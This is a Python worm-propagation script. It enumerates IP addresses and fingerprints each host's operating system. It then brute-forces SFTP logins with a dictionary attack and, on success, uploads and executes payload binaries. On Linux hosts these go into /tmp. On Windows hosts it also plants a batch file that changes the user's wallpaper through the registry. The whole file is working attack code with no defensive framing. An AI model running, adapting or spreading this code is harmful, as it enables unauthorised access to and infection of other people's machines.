
from get_ip import getIP
from get_os import getos
from colorama import init, Fore, Back, Style
from termcolor import colored
import pysftp as sftp
import dict_attack
import threading

def Linux(handle, user, password, ip):
    handle.makedirs('/tmp/m0ng0li4n')
    handle.put('/home/kali/Desktop/worm/bin/le','/tmp/worrm/le')
    handle.put('/home/kali/Desktop/worm/bin/ld','/tmp/worrm/ld')
    handle.execute('chmod +x /tmp/worrm/le')
    handle.execute('chmod +x /tmp/worrm/ld')
    handle.execute('/tmp/worrm/le')
    print(colored(Fore.RED + ip + 'has been dealt with'))

def Windows(handle, user, password, ip):
    f = open('windowsWallaper.bat','wt')
    user = user[0].capitalize() + str(user[1:])
    f.write('reg add "HOSTKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d C:\\Users\\'+user+'\\worrm\\wallpaper.bmp  \n')
    f.write('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')
    f.close()
    handle.makedirs('C:\\Users\\'+user+'\\m0ng0li4n')
    handle.put('/home/kali/Desktop/worm/bin/windowsFlow.exe','C:\\Users\\'+user+'\\worrm\\windowsFlow.exe')
    handle.put('/home/kali/Desktop/worm/bin/windowsSaver.exe','C:\\Users\\'+user+'\\worrm\\windowsSaver.exe')
    handle.put('/home/kali/Desktop/worm/wallpaper.bmp', 'C:\\Users\\'+user+'\\worrm\\wallpaper.bmp')
    handle.put('/home/kali/Desktop/worm/windowsWallaper.bat','C:\\Users'+user+'\\worrm\\windowsWallaper.bat')
    handle.execute('C:\\Users\\'+user+'\\worrm\\windowsFlow.exe')
    print(colored(Fore.YELLOW + ip + ' has been dealt with'))

ips = getIP()
ips.remove('')
for ip in ips:
    try:
        os = getos(ip)
        print(colored(Fore.GREEN + ip + ' --> '+ os))
        if os == 'Linux':
            try:
                print(colored(Fore.YELLOW + 'Dictonary Attack'))
                handle, user, password = dict_attack.attack(ip)
                t = threading.Thread(target=Linux, args=(handle, user, password, ip))
                t.daemon = False
                t.start()

            except:
                print(colored(Fore.YELLOW + '[-] Skipping ' + ip))
        elif os == 'AVtech' or os == 'Microsoft':
            try:
                print(colored(Fore.YELLOW + 'Dictonary Attack'))
                handle,user,password = dict_attack.attack(ip)
                t = threading.Thread(target=Windows, args = (handle, user, password, ip))
                t.daemon = False
                t.start()

            except Exception as e:
                print(e)
                print(colored(Fore.YELLOW + '[-] Skipping ' + ip))
            pass

    except:
        print(colored(Fore.RED + 'Failed :' + ip))
